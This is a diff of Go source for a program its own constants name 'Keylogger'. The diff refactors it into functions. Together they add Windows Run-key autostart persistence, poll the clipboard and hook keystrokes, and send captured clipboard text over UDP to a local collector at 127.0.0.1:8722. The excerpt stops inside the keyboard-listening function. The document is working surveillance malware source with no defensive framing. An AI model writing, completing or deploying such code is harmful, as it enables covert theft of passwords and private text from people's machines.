@@ -8,7 +8,7 @@ package main
 import (
 	"fmt"
 	"github.com/atotto/clipboard"
-	"github.com/robotn/gohook"
+	hook "github.com/robotn/gohook"
 	"golang.org/x/sys/windows/registry"
 	"net"
 	"os"
@@ -16,16 +16,36 @@ import (
 )
 
 const (
-	Protocol  = "udp"
-	Address   = "127.0.0.1:8722"
-	KeyName   = `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
-	AppName   = "Keylogger"
+	Protocol = "udp"
+	Address  = "127.0.0.1:8722"
+
+	KeyName = `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
+	AppName = "Keylogger"
+
 	OSWindows = "windows"
 	OSLinux   = "linux"
 	OSDarwin  = "darwin"
 )
 
+var conn net.Conn
+
+func init() {
+	var err error
+	conn, err = net.Dial(Protocol, Address)
+	if err != nil {
+		return
+	}
+}
+
 func main() {
+	defer conn.Close()
+	setAutoStart()
+	go listenClipboard()
+	go listenKeyboard()
+	select {}
+}
+
+func setAutoStart() {
 	switch runtime.GOOS {
 	case OSWindows:
 		filename := os.Args[0]
@@ -42,24 +62,20 @@ func main() {
 	default:
 		// Does not support other platforms
 	}
+}
 
-	conn, err := net.Dial(Protocol, Address)
-	if err != nil {
-		return
-	}
-	defer conn.Close()
-
-	go func() {
-		var text string
-		for {
-			t, _ := clipboard.ReadAll()
-			if t != text && t != "" {
-				text = t
-				conn.Write([]byte(text))
-			}
+func listenClipboard() {
+	var text string
+	for {
+		t, _ := clipboard.ReadAll()
+		if t != text && t != "" {
+			text = t
+			conn.Write([]byte(text))
 		}
-	}()
+	}
+}
 
+func listenKeyboard() {
 	evChan := hook.Start()
 	defer hook.End()
 	for ev := range evChan {
